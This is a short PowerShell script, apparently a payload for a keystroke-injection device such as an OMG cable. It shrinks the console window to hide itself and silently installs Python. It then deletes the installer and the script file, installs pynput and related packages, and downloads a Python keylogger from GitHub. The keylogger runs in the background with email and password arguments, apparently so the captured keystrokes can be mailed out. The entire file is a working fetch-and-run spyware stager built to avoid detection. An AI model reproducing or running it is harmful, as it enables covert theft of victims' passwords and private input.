mode con:cols=18 lines=1
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
wget "https://www.python.org/ftp/python/3.8.0/python-3.8.0.exe" -outfile "C:\Users\Public\python-3.8.0.exe"
C:\Users\Public\python-3.8.0.exe /quiet InstallAllUsers=0 PrependPath=1 Include_test=0
$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
Start-Sleep -Seconds 40
Remove-Item C:\Users\Public\python-3.8.0.exe
Remove-Item .\install_python.ps1
invoke-expression 'cmd /c start powershell -Command { Start-Sleep -Seconds 20; $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"); python -m pip install --upgrade pip; pip install wheel; pip install pynput; pip install pywin32; pip install requests; $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"); wget "https://github.com/csandoval63/OMGCableStuff/raw/master/Python%20keylogger%20stuff%20with%20DUCKYscript/pythonkeyloggerv2.py" -outfile "C:\Users\Public\pythonkl.py"; $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"); pythonw "C:\Users\Public\pythonkl.py" $emailpy $pwpy }'
[Environment]::Exit(1)
